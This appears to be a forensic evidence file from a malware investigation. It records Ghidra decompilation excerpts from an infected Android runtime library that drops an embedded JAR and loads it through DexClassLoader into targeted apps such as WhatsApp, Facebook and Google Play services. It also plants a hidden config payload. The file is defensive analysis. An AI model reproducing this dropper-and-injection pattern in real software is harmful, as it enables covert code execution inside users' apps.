# Ghidra Native Loader Evidence

This file records selected Ghidra 11.4.2 headless findings from the infected `libandroid_runtime.so` libraries. It intentionally stores short, relevant excerpts instead of full decompiler dumps.

## Embedded JAR Symbol

`readelf -Ws` identifies `_c_cvfua1` as the embedded JAR object in both architectures:

```text
64-bit: 000000000009c440 61239 OBJECT GLOBAL DEFAULT 11 _c_cvfua1
32-bit: 0008c7a0         61239 OBJECT GLOBAL DEFAULT 13 _c_cvfua1
```

The helper function `_f_cvfubb2` writes this object to disk:

```c
undefined8 _f_cvfubb2(char *param_1)
{
  int __fd;
  ssize_t sVar1;

  __fd = open(param_1, 0x242, 0x1ff);
  if (__fd < 1) {
    return 0;
  }
  sVar1 = write(__fd, PTR__c_cvfua1_00374708, 0xef37);
  if ((int)sVar1 != 0xef37) {
    close(__fd);
    return 0;
  }
  fsync(__fd);
  close(__fd);
  return 1;
}
```

Extracted payload metadata:

```text
1968ad3dcef956501f0e5fdff58a3e531c409c4b8137393beed4c14d53636aa2  lib64_c_cvfua1_payload.jar
1968ad3dcef956501f0e5fdff58a3e531c409c4b8137393beed4c14d53636aa2  lib32_c_cvfua1_payload.jar
a2b585d81ea1436a05d4fdc1f8ecb8a5668cef1b9be772110fdace83341b10e9  classes.dex
```

`unzip -l` output:

```text
Archive: lib64_c_cvfua1_payload.jar
  Length      Date    Time    Name
---------  ---------- -----   ----
       73  2024-12-23 16:51   META-INF/MANIFEST.MF
    86192  2024-12-23 16:51   classes.dex
---------                     -------
    86265                     2 files
```

The decompiled first-stage Java entrypoint is [services.java](../jadx_sources/first_stage/com/system/framework/media/services.java).

## Native Process And Package Logic

The native function `get_pid_name` reads `/proc/<pid>/cmdline`:

```c
undefined8 get_pid_name(uint param_1, char *param_2, int param_3)
{
  sprintf(param_2, "/proc/%d/cmdline", (ulong)param_1);
  int fd = open(param_2, 0);
  if (fd != 0) {
    memset(param_2, 0, (long)param_3);
    ssize_t n = read(fd, param_2, (long)(param_3 + -1));
    close(fd);
  }
  return 0;
}
```

Ghidra shows `___andver_log_println` calls process-name logic and compares the current process name against package symbols including:

```text
settingspackage
systemuipackage
mmsspackagea / mmsspackageb / mmsspackagec
browserpackagea / browserpackageb
contactspackage
appkpackagea = com.whatsapp
appkpackageb = com.facebook.katana
appkpackagec = com.instagram.android
appkpackaged = jp.naver.line.android
appkpackagee = com.twitter.android
appkpackagef = com.android.vending
appkpackageg = com.google.android.gms
installerpackagea / installerpackageb
```

The same function builds a process-specific path under `/data/data/`:

```c
strcpy(path, databasedir);
strcat(path, current_process_name);
strcat(path, "/ext_oat");
```

It then writes the embedded JAR and loads it:

```c
strcat(path, jarfilename);
if (access(path, 4) != 0) {
  _f_cvfubb2(path, 1);
  _f_cvfubb6(path);
  _f_cvfubb5(path, mode);
}

loader = _f_cafde2(env, path, oat_dir);
if (loader == 0) {
  loader = DEXNewClassLoaderExt(env, path, oat_dir);
}
instance = _f_cafde3(env, loader, xxbclasspackage);
_f_cafde4(env, instance, xxbfuncname, xxbfuncArgRtnT, 0, package_match_flag);
```

The relevant string symbols are:

```text
jarfilename     = /com@system@framework@media@v2306.jar
dexfilename     = /com@system@framework@media@v2306.dex
databasedir     = /data/data/
xxbclasspackage = com.system.framework.media.services
xxbfuncname     = onCreate
xxbfuncArgRtnT  = (I)V
```

## DexClassLoader Creation

Ghidra decompiles `DEXNewClassLoaderExt` as a JNI helper that creates `dalvik/system/DexClassLoader`:

```c
FindClass("java/lang/ClassLoader");
GetStaticMethodID("getSystemClassLoader", "()Ljava/lang/ClassLoader;");
CallStaticObjectMethod(...);
FindClass("dalvik/system/DexClassLoader");
GetMethodID("<init>", "(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/ClassLoader;)V");
NewObject(..., jar_path, oat_dir, 0, system_class_loader);
```

This matches the Java decompiled loader behavior documented in [Malware Execution Flow](../../docs/08-malware-execution-flow.md).

## Secondary Hidden Config Path

`load_jm_model` creates another hidden per-process path:

```c
get_pid_name(getpid(), process_name, 0x200);
strcpy(path, data_base_dir);
strcat(path, process_name);
strcat(path, jm_model_dir);        // /.cofigs
mkdir(path, 0x1ff);
strcat(path, jm_model_name);       // /.google_service_config
write_file(path, &DAT_00195b00, 0x5ee7);
chmod(path, 0x1ff);
```

It then sets:

```text
System.setProperty("jm_model_config", "/.cofigs/.google_service_config/com.android.system.statlib.STMM")
```

This is suspicious because it stores hidden per-process configuration/payload material under app-private storage and exposes it through a Java system property.
